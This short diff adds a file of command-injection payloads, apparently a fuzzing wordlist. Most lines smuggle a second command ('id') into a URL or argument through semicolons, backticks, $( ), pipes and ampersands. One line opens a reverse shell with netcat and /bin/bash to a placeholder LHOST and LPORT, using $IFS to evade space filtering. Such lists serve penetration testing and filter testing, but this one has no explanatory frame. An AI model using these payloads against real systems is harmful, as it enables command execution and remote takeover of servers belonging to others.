@@ -1,0 +1,10 @@
+--help
+http://LHOST/;id
+http://LHOST/$(id)
+`id`
+;id
+$(id)
+;nc$IFS-e$IFS/bin/bash$IFSLHOST$IFSLPORT
+| id
+& id
+&& id
